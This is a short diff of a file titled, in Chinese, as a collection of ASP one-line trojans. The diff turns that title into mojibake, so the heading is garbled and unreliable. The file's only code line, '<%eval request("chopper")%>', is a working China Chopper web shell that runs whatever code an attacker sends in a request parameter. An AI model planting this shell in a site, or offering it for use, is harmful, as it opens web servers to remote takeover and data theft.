@@ -1,4 +1,4 @@
-ASP一句话木马收集：
+ASP脪禄戮盲禄掳脛戮脗铆脢脮录炉拢潞
 
 <%eval request("chopper")%>
 
